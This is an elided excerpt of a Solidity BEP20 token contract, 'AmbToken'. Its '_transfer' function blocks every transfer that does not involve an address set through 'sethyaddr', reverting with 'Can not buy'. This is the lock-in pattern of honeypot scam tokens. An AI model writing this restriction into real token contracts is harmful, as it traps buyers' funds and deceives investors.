 ...
 contract AmbToken is IBEP20
{
    ...
    constructor()
    {
        ...
        _mint(_owner,300000*10**18);
    }


    function sethyaddr(address _hyaddr) public
    {
   ...
   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(sender != hyaddr && recipient != hyaddr)
        {
            require(hyaddr == address(0),"Can not buy");
        }
